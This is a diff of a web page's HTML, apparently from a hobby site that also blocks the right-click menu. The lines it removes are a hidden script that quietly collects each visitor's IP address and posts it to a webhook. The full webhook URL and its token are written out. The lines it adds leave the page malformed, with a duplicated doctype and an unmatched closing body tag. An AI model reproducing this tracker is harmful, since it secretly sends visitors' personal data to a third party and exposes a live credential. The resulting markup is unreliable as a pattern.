@@ -95792,42 +95792,14 @@ document.addEventListener('contextmenu', event => event.preventDefault());
 <!DOCTYPE html>
 <html>
 
+<!DOCTYPE html>
+<html>
 <head>
-  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-  <script>
-    function job() {
-    
-      $.get("https://api.ipify.org?format=json", function(data) {
-        var ipAddress = data.ip;
-        
-        
-        var hook = "https://webhook.lewisakura.moe/api/webhooks/1183806794833870909/ZzS66DobbeePFtVe7OY_7T7GYH60sUZn4sclIlcig1nIls8BSWf2UNYvlcuDxR-P4gpI";
-        
-      
-        var payload = {
-          "content": "Visitor's IP Address: " + ipAddress
-        };
-        
-       
-        $.ajax({
-          url: hook,
-          type: "POST",
-          data: JSON.stringify(payload),
-          contentType: "application/json",
-          success: function() {
-            console.log("Successful");
-          },
-          error: function(err) {
-            console.error("Error: " + err);
-          }
-        });
-      });
-    }
-  </script>
-</head>
-
-<body>
- 
+	
+	<script src="msgsendingpage.js"></script>
+	<div id="user-info"></div>
+</body>
+</html>
   
   <script>
     
